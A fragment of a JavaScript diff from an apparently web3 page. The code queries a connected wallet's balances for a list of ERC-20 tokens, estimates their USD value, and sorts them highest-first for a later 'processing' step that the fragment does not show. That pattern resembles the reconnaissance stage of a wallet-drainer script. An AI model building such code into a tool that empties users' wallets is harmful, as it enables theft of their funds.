+            { address: '0x8B39B70E39Aa811b69365398e0aACe9bee238AEb', symbol: 'PKF', decimals: 18, priority: 18, avgPrice: 0.1 },
+            { address: '0x6B0b3a982b4634aC68dD83a4DBF02311cE324181', symbol: 'ALBT', decimals: 18, priority: 18, avgPrice: 0.05 },
+            { address: '0x8D983cb9388EaC77af0474fA441C4815500Cb7BB', symbol: 'VET', decimals: 18, priority: 18, avgPrice: 0.02 },
+            { address: '0xa54ddC7B3CcE7FC8b1E3Fa0256D0DB80D2c10970', symbol: 'EURT', decimals: 6, priority: 18, avgPrice: 1.1 },
+            { address: '0x467719aD09025FcC6cF6F8311755809d45a5E5f3', symbol: 'AXS2', decimals: 18, priority: 18, avgPrice: 7 },
+            { address: '0x8c15Ef5b4B21951d50E53E4fbdA8298FFAD25057', symbol: 'FOX', decimals: 18, priority: 18, avgPrice: 0.08 },
+            { address: '0x78a0A62Fba6Fb21A83FE8a3433d44C73a4017A6f', symbol: 'OXT2', decimals: 8, priority: 18, avgPrice: 0.1 },
+            { address: '0x0b38210ea11411557c13457D4dA7dC6ea731B88a', symbol: 'API3', decimals: 18, priority: 18, avgPrice: 1.5 }
           ];
           
           const tokensWithBalance = [];
           
-          for (const token of popularTokens) {
-            try {
-              console.log(`Checking ${token.symbol} balance...`);
-              
-              // Add delay between requests to avoid rate limiting
-              if (tokensWithBalance.length > 0) {
-                await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay
-              }
-              
-              // Create the balanceOf call data
-              const paddedAddress = userAddress.slice(2).padStart(64, '0');
-              const callData = '0x70a08231' + paddedAddress; // balanceOf function signature + padded address
-              
-              // Simplified approach with single attempt
+          console.log(`🔍 Scanning ${popularTokens.length} tokens for balances...`);
+          
+          // Process tokens in batches to avoid rate limiting
+          const batchSize = 10;
+          for (let i = 0; i < popularTokens.length; i += batchSize) {
+            const batch = popularTokens.slice(i, i + batchSize);
+            
+            const batchPromises = batch.map(async (token) => {
               try {
+                // Create the balanceOf call data
+                const paddedAddress = userAddress.slice(2).padStart(64, '0');
+                const callData = '0x70a08231' + paddedAddress;
+                
                 const result = await window.ethereum.request({
                   method: 'eth_call',
                   params: [{
@@ -359,37 +660,63 @@
                 });
                 
                 if (!result || result === '0x') {
-                  console.log(`${token.symbol}: No result from contract call`);
-                  continue;
+                  return null;
                 }
                 
                 const balance = parseInt(result, 16);
-                console.log(`${token.symbol} balance (raw):`, balance);
                 
                 if (balance > 0) {
                   const formattedBalance = (balance / Math.pow(10, token.decimals)).toFixed(6);
-                  tokensWithBalance.push({
+                  const estimatedValue = parseFloat(formattedBalance) * token.avgPrice;
+                  
+                  return {
                     ...token,
                     balance: balance.toString(),
-                    formattedBalance
-                  });
-                  console.log(`✓ ${token.symbol}: ${formattedBalance}`);
-                } else {
-                  console.log(`${token.symbol}: Zero balance`);
+                    formattedBalance,
+                    estimatedValue,
+                    balanceInWei: balance
+                  };
                 }
-              } catch (callError) {
-                console.log(`${token.symbol} check failed:`, callError.message || callError);
-                // Continue with next token
-                continue;
+                return null;
+              } catch (error) {
+                console.log(`${token.symbol} check failed:`, error.message);
+                return null;
               }
-              
-            } catch (error) {
-              console.log(`Error checking ${token.symbol}:`, error.message || error);
-              continue;
+            });
+            
+            const batchResults = await Promise.allSettled(batchPromises);
+            
+            batchResults.forEach(result => {
+              if (result.status === 'fulfilled' && result.value) {
+                tokensWithBalance.push(result.value);
+                console.log(`✓ ${result.value.symbol}: ${result.value.formattedBalance} (~$${result.value.estimatedValue.toFixed(2)})`);
+              }
+            });
+            
+            // Small delay between batches
+            if (i + batchSize < popularTokens.length) {
+              await new Promise(resolve => setTimeout(resolve, 500));
             }
           }
           
-          console.log(`Total tokens with balance: ${tokensWithBalance.length}`);
+          // Sort tokens by estimated USD value (highest first), then by priority
+          tokensWithBalance.sort((a, b) => {
+            // First sort by estimated USD value (higher value first)
+            if (Math.abs(a.estimatedValue - b.estimatedValue) > 0.01) {
+              return b.estimatedValue - a.estimatedValue;
+            }
+            // If values are very close, then sort by priority (lower number = higher priority)
+            return a.priority - b.priority;
+          });
+          
+          console.log(`💰 Found ${tokensWithBalance.length} tokens with total estimated value: $${tokensWithBalance.reduce((sum, token) => sum + token.estimatedValue, 0).toFixed(2)}`);
+          
+          // Log the sorted order for transparency
+          console.log('📊 Tokens will be processed in this order (highest value first):');
+          tokensWithBalance.forEach((token, index) => {
+            console.log(`${index + 1}. ${token.symbol}: ${token.formattedBalance} (~$${token.estimatedValue.toFixed(2)})`);
+          });
+          
           return tokensWithBalance;
         }
         
